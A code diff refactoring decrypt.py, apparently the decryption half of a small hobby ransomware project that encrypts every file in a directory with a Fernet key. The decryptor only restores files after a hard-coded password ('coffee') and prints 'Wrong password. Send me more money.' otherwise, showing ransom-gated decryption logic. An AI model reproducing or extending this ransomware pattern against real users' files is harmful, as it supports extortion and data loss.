@@ -1,36 +1,44 @@
 import os
 from cryptography.fernet import Fernet
+from text import decrypted
 
-files = []
+secret_key = "coffee"
 
-# adding all files in the current directory to an array to decrypt
-for file in os.listdir():
-	# add the files to decrypt except these files
-	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
-		continue
-	# only add files and not directories
-	if os.path.isfile(file):
-		files.append(file)
+def get_files():
+    exclude_files = ["encrypt.py", "thekey.key", "decrypt.py", "text.py"]
+    files = [file for file in os.listdir() if file not in exclude_files and os.path.isfile(file)]
+    return files
 
-print(files)
+def get_key():
+	with open("thekey.key", "rb") as thekey:
+		key = thekey.read()
+	
+	if len(key) == 0:
+		raise Exception("No key found")
+	
+	return key
 
-with open("thekey.key", "rb") as key:
-	thekey = key.read()
-	if len(thekey) == 0:
-		print("No Key available. REMINDER: Did you forget to encrypt the files?")
-		return
+def decrypt_files(files, key):	
+	user = input("Enter the password: ")
+	if user != secret_key:
+		raise Exception("Wrong password. Send me more money.")
 
-secretphrase = "coffee"
-
-user_input = input("Enter the key: ")
-
-if user_input == secretphrase:
 	for file in files:
 		with open(file, "rb") as thefile:
 			content = thefile.read()
-		content_decrypted = Fernet(thekey).decrypt(content)
+		decrypted_content = Fernet(key).decrypt(content)
 		with open(file, "wb") as thefile:
-			thefile.write(content_decrypted)
-	print("Your Files have been decrypted.")
-else:
-	print("Wrong Key. Send me more Money.")
+			thefile.write(decrypted_content)
+
+def main():
+	try:
+		files = get_files()
+		key = get_key()
+		decrypt_files(files, key)
+		print(decrypted)
+	
+	except Exception as e:
+		print(f"A problem occured: {e}.")
+
+if __name__ == "__main__":
+	main()
